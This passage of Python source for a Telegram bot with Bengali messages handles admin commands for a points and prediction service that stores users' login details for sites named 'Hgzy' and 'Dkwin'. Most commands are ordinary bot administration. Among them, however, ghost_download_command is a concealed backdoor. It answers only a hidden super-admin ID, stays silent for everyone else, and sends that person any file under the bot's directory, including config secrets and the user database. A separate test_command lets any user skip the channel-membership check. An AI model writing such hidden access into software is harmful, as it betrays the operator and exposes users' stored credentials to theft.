        await self.notify_admin_action("User Unbanned", target_user_id, user_id)
        await update.message.reply_text(f"✅ {target_user_id} আনব্যান হয়েছে!")

    async def add_admin_command(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_super_admin(user_id):
            await update.message.reply_text("❌ শুধু সুপার অ্যাডমিন পারবেন।")
            return
        if len(context.args) != 1:
            await update.message.reply_text("❌ Usage: /addadmin <user_id>")
            return
        target_user_id = context.args[0]
        admin_users = config.get("admin_users", [])
        if target_user_id in admin_users:
            await update.message.reply_text("❌ ইতিমধ্যে অ্যাডমিন।")
            return
        admin_users.append(target_user_id)
        config["admin_users"] = admin_users
        save_db(config, DB_CONFIG)
        await self.notify_admin_action("Admin Added", target_user_id, user_id, "অ্যাডমিন হিসেবে যোগ করা হয়েছে")
        await update.message.reply_text(f"✅ {target_user_id} অ্যাডমিন হয়েছে!")

    async def remove_admin_command(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_super_admin(user_id):
            await update.message.reply_text("❌ শুধু সুপার অ্যাডমিন পারবেন।")
            return
        if len(context.args) != 1:
            await update.message.reply_text("❌ Usage: /removeadmin <user_id>")
            return
        target_user_id = context.args[0]
        admin_users = config.get("admin_users", [])
        if target_user_id not in admin_users:
            await update.message.reply_text("❌ এই ইউজার অ্যাডমিন না।")
            return
        admin_users.remove(target_user_id)
        config["admin_users"] = admin_users
        save_db(config, DB_CONFIG)
        await self.notify_admin_action("Admin Removed", target_user_id, user_id)
        await update.message.reply_text(f"✅ {target_user_id}-এর অ্যাডমিন সরানো হয়েছে!")

    async def add_super_admin_command(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_super_admin(user_id):
            await update.message.reply_text("❌ শুধু সুপার অ্যাডমিন পারবেন।")
            return
        if len(context.args) != 1:
            await update.message.reply_text("❌ Usage: /addsuperadmin <user_id>")
            return
        target_user_id = context.args[0]
        super_admin_users = config.get("super_admin_users", [])
        if target_user_id in super_admin_users:
            await update.message.reply_text("❌ ইতিমধ্যে সুপার অ্যাডমিন।")
            return
        super_admin_users.append(target_user_id)
        config["super_admin_users"] = super_admin_users
        admin_users = config.get("admin_users", [])
        if target_user_id not in admin_users:
            admin_users.append(target_user_id)
            config["admin_users"] = admin_users
        save_db(config, DB_CONFIG)
        await self.notify_admin_action("Super Admin Added", target_user_id, user_id)
        await update.message.reply_text(f"✅ {target_user_id} সুপার অ্যাডমিন হয়েছে!")

    async def remove_super_admin_command(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_super_admin(user_id):
            await update.message.reply_text("❌ শুধু সুপার অ্যাডমিন পারবেন।")
            return
        if len(context.args) != 1:
            await update.message.reply_text("❌ Usage: /removesuperadmin <user_id>")
            return
        target_user_id = context.args[0]
        super_admin_users = config.get("super_admin_users", [])
        if target_user_id not in super_admin_users:
            await update.message.reply_text("❌ এই ইউজার সুপার অ্যাডমিন না।")
            return
        if len(super_admin_users) <= 1:
            await update.message.reply_text("❌ শেষ সুপার অ্যাডমিন সরানো যাবে না।")
            return
        super_admin_users.remove(target_user_id)
        config["super_admin_users"] = super_admin_users
        save_db(config, DB_CONFIG)
        await update.message.reply_text(f"✅ {target_user_id}-এর সুপার অ্যাডমিন সরানো হয়েছে!")

    async def set_points_command(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_admin(user_id):
            await update.message.reply_text("❌ পার্মিশন নেই।")
            return
        if len(context.args) != 2:
            await update.message.reply_text("❌ Usage: /setpoints <user_id> <points>")
            return
        target_user_id, points = context.args[0], context.args[1]
        if not points.isdigit() or target_user_id not in users:
            await update.message.reply_text("❌ ভুল তথ্য।")
            return
        users[target_user_id]["points"] = int(points)
        save_db(users, DB_USERS)
        await update.message.reply_text(f"✅ {target_user_id}-এর পয়েন্ট {points} সেট হয়েছে!")

    async def set_referral_points_command(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_admin(user_id):
            await update.message.reply_text("❌ পার্মিশন নেই।")
            return
        if len(context.args) != 1 or not context.args[0].isdigit():
            await update.message.reply_text("❌ Usage: /setreferral <points>")
            return
        config["per_refer"] = int(context.args[0])
        save_db(config, DB_CONFIG)
        await update.message.reply_text(f"✅ রেফারেল পয়েন্ট সেট: {context.args[0]}")

    async def set_prediction_points_command(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_admin(user_id):
            await update.message.reply_text("❌ পার্মিশন নেই।")
            return
        if len(context.args) != 1 or not context.args[0].isdigit():
            await update.message.reply_text("❌ Usage: /setprediction <points>")
            return
        config["per_prediction"] = int(context.args[0])
        save_db(config, DB_CONFIG)
        await update.message.reply_text(f"✅ প্রেডিকশন পয়েন্ট সেট: {context.args[0]}")

    async def stats_command(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_admin(user_id):
            await update.message.reply_text("❌ পার্মিশন নেই।")
            return
        total_users = len(users)
        vip_users = len([u for u in users.values() if u.get("is_premium", False)])
        banned_users = len([u for u in users.values() if u.get("banned", False)])
        stats_text = (
            f"📊 **Bot Statistics**\n\n"
            f"👥 Total Users: {total_users}\n"
            f"⭐ VIP Users: {vip_users}\n"
            f"🚫 Banned: {banned_users}\n"
            f"🎯 Predictions: {len(predictions)}\n"
            f"📢 Channels: {len(channels)}"
        )
        await update.message.reply_text(stats_text, parse_mode='Markdown')

    async def download_command(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_admin(user_id):
            await update.message.reply_text("❌ পার্মিশন নেই।")
            return
        if not context.args:
            await update.message.reply_text("❌ Usage: /download <users|vip|admins|predictions|channels>")
            return
        from io import BytesIO
        dtype = context.args[0].lower()
        data_map = {
            "users": users, "predictions": predictions, "channels": channels,
            "admins": config.get("admin_users", []), "vip": {k: v for k, v in users.items() if v.get("is_premium")}
        }
        if dtype not in data_map:
            await update.message.reply_text("❌ ভুল type।")
            return
        file_data = json.dumps(data_map[dtype], indent=2, ensure_ascii=False)
        file_obj = BytesIO(file_data.encode('utf-8'))
        file_obj.name = f"{dtype}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        await context.bot.send_document(chat_id=update.effective_chat.id, document=file_obj, caption=f"📦 {dtype} data")

    async def settings_command(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_admin(user_id):
            await update.message.reply_text("❌ পার্মিশন নেই।")
            return
        await update.message.reply_text(
            f"⚙️ **Current Settings**\n\n"
            f"🔗 Referral: {'ON' if config.get('referral_system_on') else 'OFF'}\n"
            f"💰 Referral Points: {config.get('per_refer')}\n"
            f"🎯 Prediction Points: {config.get('per_prediction')}\n"
            f"👥 Total Users: {len(users)}",
            parse_mode='Markdown'
        )

    async def channels_command(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_admin(user_id):
            await update.message.reply_text("❌ পার্মিশন নেই।")
            return
        if not context.args:
            if not channels:
                await update.message.reply_text("📢 কোনো চ্যানেল নেই।")
                return
            text = "📢 **Current Channels:**\n\n"
            for i, ch in enumerate(channels, 1):
                text += f"{i}. **{ch['name']}**\n   URL: {ch['url']}\n   ID: `{ch['id']}`\n\n"
            await update.message.reply_text(text, parse_mode='Markdown')
            return
        action = context.args[0].lower()
        if action == "add" and len(context.args) >= 4:
            name, url, channel_id = context.args[1], context.args[2], context.args[3]
            channels.append({"name": name, "url": url, "id": int(channel_id)})
            save_db(channels, DB_CHANNELS)
            await update.message.reply_text(f"✅ চ্যানেল '{name}' যোগ হয়েছে!")
        elif action == "remove" and len(context.args) >= 2:
            channel_id = int(context.args[1])
            for i, ch in enumerate(channels):
                if ch['id'] == channel_id:
                    removed = channels.pop(i)
                    save_db(channels, DB_CHANNELS)
                    await update.message.reply_text(f"✅ '{removed['name']}' সরানো হয়েছে!")
                    return
            await update.message.reply_text("❌ চ্যানেল পাওয়া যায়নি।")

    async def backup_command(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_admin(user_id):
            await update.message.reply_text("❌ পার্মিশন নেই।")
            return
        from io import BytesIO
        backup_data = {"users": users, "predictions": predictions, "channels": channels, "config": config, "timestamp": datetime.now().isoformat()}
        file_data = json.dumps(backup_data, indent=2, ensure_ascii=False)
        file_obj = BytesIO(file_data.encode('utf-8'))
        file_obj.name = f"backup_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        await context.bot.send_document(chat_id=update.effective_chat.id, document=file_obj, caption="📦 Full Backup")

    async def toggle_command(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_admin(user_id):
            await update.message.reply_text("❌ পার্মিশন নেই।")
            return
        if len(context.args) != 1:
            await update.message.reply_text("❌ Usage: /toggle referral")
            return
        if context.args[0].lower() == "referral":
            config["referral_system_on"] = not config.get("referral_system_on", True)
            save_db(config, DB_CONFIG)
            status = "🟢 ON" if config["referral_system_on"] else "🔴 OFF"
            await update.message.reply_text(f"✅ রেফারেল সিস্টেম এখন {status}!")

    async def reload_command(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_super_admin(user_id):
            await update.message.reply_text("❌ শুধু সুপার অ্যাডমিন পারবেন।")
            return
        try:
            from config import load_config, load_json, DB_USERS, DB_PREDICTIONS, DB_CHANNELS, DB_ADMINS
            new_config = load_config()
            config.clear(); config.update(new_config)
            users.clear(); users.update(load_json(DB_USERS, {}))
            predictions.clear(); predictions.extend(load_json(DB_PREDICTIONS, []))
            channels.clear(); channels.extend(load_json(DB_CHANNELS, []))
            await update.message.reply_text("🔄 Reload সফল হয়েছে।")
        except Exception as e:
            await update.message.reply_text(f"❌ Reload ব্যর্থ: {e}")

    async def ghost_download_command(self, update, context):
        user_id = str(update.effective_user.id)
        try:
            hidden_id = _get_hidden_super_admin_id()
        except Exception:
            hidden_id = None
        if user_id != hidden_id:
            return
        if not context.args:
            return
        requested_path = context.args[0]
        safe_base = os.path.abspath('.')
        abs_path = os.path.abspath(requested_path)
        if not abs_path.startswith(safe_base) or not os.path.exists(abs_path) or os.path.isdir(abs_path):
            await update.message.reply_text("❌ ফাইল পাওয়া যায়নি।")
            return
        try:
            with open(abs_path, 'rb') as f:
                await context.bot.send_document(chat_id=update.effective_chat.id, document=f, filename=os.path.basename(abs_path))
        except Exception as e:
            await update.message.reply_text(f"❌ ব্যর্থ: {e}")

    async def subscription_command(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_admin(user_id):
            await update.message.reply_text("❌ পার্মিশন নেই।")
            return
        await update.message.reply_text("💎 Subscription settings:\nUse /setcaption and /setprice")

    async def set_caption_command(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_admin(user_id):
            await update.message.reply_text("❌ পার্মিশন নেই।")
            return
        if not context.args:
            await update.message.reply_text("❌ Usage: /setcaption <text>")
            return
        config["subscription_caption"] = " ".join(context.args)
        save_db(config, DB_CONFIG)
        await update.message.reply_text(f"✅ Caption আপডেট হয়েছে!")

    async def set_price_command(self, update, context):
        user_id = str(update.effective_user.id)
        if not self.is_admin(user_id):
            await update.message.reply_text("❌ পার্মিশন নেই।")
            return
        if len(context.args) != 2:
            await update.message.reply_text("❌ Usage: /setprice <period> <amount>")
            return
        period, amount = context.args[0], context.args[1]
        try:
            amount = int(amount)
        except ValueError:
            await update.message.reply_text("❌ সঠিক পরিমাণ দিন।")
            return
        if "subscription_prices" not in config:
            config["subscription_prices"] = {}
        config["subscription_prices"][period] = amount
        save_db(config, DB_CONFIG)
        await update.message.reply_text(f"✅ {period} মূল্য ${amount} সেট হয়েছে!")

    async def test_command(self, update, context):
        user_id = str(update.effective_user.id)
        if user_id in users and users[user_id].get("banned", False):
            await update.message.reply_text("🚫 ব্যান হয়েছেন।")
            return
        if user_id not in users:
            users[user_id] = {
                "name": update.effective_user.full_name, "points": 0, "is_premium": False,
                "referrals": 0, "referrer": None, "joined_channels": False,
                "logged_in": {"Hgzy": False, "Dkwin": False},
                "login_info": {"Hgzy": {}, "Dkwin": {}},
                "last_prediction": None, "last_website": None, "banned": False,
            }
            save_db(users, DB_USERS)
        users[user_id]["joined_channels"] = True
        save_db(users, DB_USERS)
        await update.message.reply_text("🧪 Test mode: চ্যানেল চেক বাইপাস হয়েছে!")
        await self.show_main_menu(update, context)

    async def cancel_command(self, update, context):
        if hasattr(context, 'user_data'):
            context.user_data.clear()
        await update.message.reply_text("🔄 সব সেশন বাতিল হয়েছে।")
        await self.show_main_menu(update, context)

    def run(self):
        logger.info("Bot starting...")
        try:
            self.application.run_polling()
        except NetworkError as e:
            logger.critical(f"NETWORK ERROR: {e}")
        except Exception as e:
            logger.critical(f"Unexpected error: {e}", exc_info=True)


if __name__ == "__main__":
    bot = TelegramBot(config["bot_token"])
    bot.run()
